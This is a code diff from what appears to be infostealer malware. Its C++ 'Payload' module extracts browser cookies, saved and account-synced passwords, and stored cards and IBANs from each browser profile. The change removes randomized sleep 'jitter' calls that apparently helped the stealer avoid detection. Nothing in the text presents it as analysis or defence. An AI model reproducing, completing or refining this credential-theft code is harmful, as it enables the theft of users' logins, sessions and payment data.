@@ -4,7 +4,6 @@
 #include "data_extractor.hpp"
 #include "handle_duplicator.hpp"
 #include "../crypto/aes_gcm.hpp"
-#include "../core/jitter.hpp"
 #include <fstream>
 #include <sstream>
 #include <iomanip>
@@ -77,8 +76,6 @@ namespace Payload {
     void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
         m_pipe.Log("PROFILE:" + profilePath.filename().string());
 
-        Core::Jitter::SleepRange(10, 50);
-
         try {
             // Cookies
             auto cookiePath = profilePath / "Network" / "Cookies";
@@ -89,8 +86,6 @@ namespace Payload {
                 }
             }
         } catch(...) {}
-
-        Core::Jitter::SleepRange(10, 40);
 
         try {
             // Passwords (local)
@@ -103,8 +98,6 @@ namespace Payload {
             }
         } catch(...) {}
 
-        Core::Jitter::SleepRange(10, 40);
-
         try {
             // Passwords (account-synced)
             auto loginAccountPath = profilePath / "Login Data For Account";
@@ -115,8 +108,6 @@ namespace Payload {
                 }
             }
         } catch(...) {}
-
-        Core::Jitter::SleepRange(10, 40);
 
         try {
             // Cards & IBANs (Web Data)
